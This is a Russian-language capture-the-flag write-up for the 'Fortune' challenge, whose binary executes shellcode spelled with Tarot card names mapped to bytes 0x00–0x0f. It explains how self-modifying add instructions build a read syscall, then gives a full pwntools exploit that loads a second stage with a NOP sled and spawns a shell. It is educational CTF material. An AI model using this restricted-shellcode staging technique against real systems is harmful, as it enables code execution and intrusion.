# Fortune

## Problem

В данном задании предлагалось написать шелкод названиями старших арканов Таро и запустить его с одним ограничением: для использования было разрешено всего 16 байт.

```c++
std::map<std::string, uint8_t> Cards {
    {  "Fool", 0x00}, {"Magician", 0x01},
    {"Priestess", 0x02}, {"Emperess",0x03},
    {"Emperor", 0x04}, {"Hierophant", 0x05},
    {"Lovers", 0x06}, {"Chariot", 0x07},
    {"Strength", 0x08}, {"Hermit", 0x09},
    {"Wheel_of_fortune", 0x0A}, {"Justice", 0x0B},
    {"Hanged_man", 0x0c}, {"Death", 0x0d},
    {"Temperance", 0x0e}, {"Devil", 0x0f}
};

extern "C" {void run_shellcode(const std::vector<uint8_t> &shellcode) {
    std::cout << "Powering up the deck....." << std::endl;
    unsigned char* code = (unsigned char*) mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(code, shellcode.data(), shellcode.size());

__asm__ (
    ".intel_syntax noprefix\n"  // Switch to Intel syntax
    "push rax\n"
    "mov rax, 0x0\n"
    "mov rbx, 0x0\n"
    "mov rcx, 0x0\n"
    "mov rdx, 0x0\n"
    "mov rdi, 0x0\n"
    "mov rsi, 0x0\n"
    "mov r8, 0x0\n"
    "mov r9, 0x0\n"
    "mov r10, 0x0\n"
    "mov r11, 0x0\n"
    "mov r12, 0x0\n"
    "mov r13, 0x0\n"
    "mov r15, 0x0\n"
    "ret\n"
    ".att_syntax prefix\n"
    :
    :
    : 
);
}
}
```

## Solution

### Идея

Основной идеей решения подобных задач всегда является повторное прочтение в RWX сегмент в обход фильтра. Таким образом нашей задачей будет являться вызов `syscall 0 (read)` со следующими значениями регистров:

 - `RAX` = 0
 - `RDI` = 0
 - `RSI ` = где-то в области шеллкода
 - `RDX` = произвольное большое число.
 
#### Концепция

После нескольких часов поисков и перебора всех возможных разрешенных комбинаций инструкций мы приходим к следующим разрешенным вариантам:
 
 - `add eax, [0x00-0xff]+` - мы можем получить путем сложения чисел, состоящих из байтов 0x00-0xff в eax любое число
 - `syscall`
 - `add [rip], eax` - мы можем положить текущее значение eax по адресу текущей исполняемой инструкции.

И если получить значениях всех OP-кодов достаточно просто, нам все еще потребуется положить в RSI адрес области шеллкода. Для этого мы воспользуемся инструкцией `pop rdi` и будем перебирать значения со стека, пока не найдем подходящее нам. В данном задание эту операцию необходимо было произвести четыре раза.

Полученных притивов должно быть достаточно, чтобы решить задание. Давайте посчитаем, какие числа нам нужно получить, чтобы решить задание

- `pop rsi` = 0x5e
- `mov edi,  0x0` = 0xbf
- `mov edx, 0xf0e` = 0xf0eba - данное число ничем не обосновано, просто его можно получить сложением достаточного числа раз числа, состоящие из байт 0x00-0xff
- `sub rax, rax` = 0xc02948


Итого финальный пэйлоад выглядит следующим образом:
```py
from pwn import *

binary = context.binary = ELF("./chall", checksec=False)
io = binary.process()

# Таблица для преобразования шеллкода в арканы
encoding ={
        0x00:"Fool",
        0x01: "Magician",
        0x02:"Priestess",
0x03:"Emperess",
0x04:"Emperor",
0x05:"Hierophant",
0x06:"Lovers",
0x07:"Chariot",
0x08:"Strength",
0x09:"Hermit",
0x0A:"Wheel_of_fortune",
0x0B:"Justice",
0x0C: "Hanged_man",
0x0D: "Death",
0x0E: "Temperance", 
0x0F: "Devil"
}

# Обратите внимание, что лишний 0x00 байт добавляется, чтобы после сложения с [rip] после желаемой операци не возникало мусорной.

# Набираем - `pop rsi` = 0x5e 
def pop_rsi():
    rsi_pop = asm('add al, 0xf')*6
    rsi_pop += asm('add al, 0x4')
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'
    rsi_pop += asm('add dword ptr [rip], eax')
    rsi_pop += b'\x00'
    return rsi_pop


# `mov edi,  0x0` = 0xbf
# Набираем 0xbf - 0x5e

def zero_edi():
    edi_zero = asm('add al, 0xf')*6
    edi_zero += asm('add al, 0x7')
    edi_zero += asm('add dword ptr [rip], eax')
    edi_zero += b'\x00'*5
    return edi_zero

# `mov edx, 0xf0e` = 0xf0eba
# Набираем 0xf0eba - 0xbf
def big_edx():
    edx_big = asm('add eax, 0xf0e0f')
    edx_big += asm('add al,0xf')*15
    edx_big += asm('add al, 0xb')
    edx_big += asm('add dword ptr [rip], eax')
    edx_big += b'\x00'*5
    return edx_big

# `sub rax, rax` = 0xc02948
# Набираем 0xc02948 - 0xf0eba
def zero_rax():
    rax_zero = asm('add eax,0x0f0f0f')*11
    rax_zero += asm('add eax,0xb0f0f')
    rax_zero += asm('add eax, 0x0f0f')*6
    rax_zero += asm('add eax, 0x90f')
    rax_zero += asm('add eax, 0x30f')
    rax_zero += asm('add al, 0x0f')*6
    rax_zero += asm('add al, 0x8')
    rax_zero += asm('add dword ptr [rip], eax')
    rax_zero += b'\x00'*3
    return rax_zero

# syscall read (stdin, shellcodeArea, BIG_EDX)
payload  = pop_rsi()
payload  += zero_edi()
payload  += big_edx()
payload  += zero_rax()
payload  += asm('syscall')

print(io.recvline())
io.recvuntil(b':')

# Кодирование шеллкода в арканы
shellcode = []
for i in payload:
    shellcode.append(encoding[i])
io.sendline(",".join(shellcode))
pause(3)

# NOP-slide чтобы точно попасть в наш шеллкод
payload = asm(shellcraft.nop())*(len(payload)+0x8*5)

# Обыкновенный шеллкод на получение шела, который мы считаем syscall-ом read в обход всех фильтров
payload += asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```
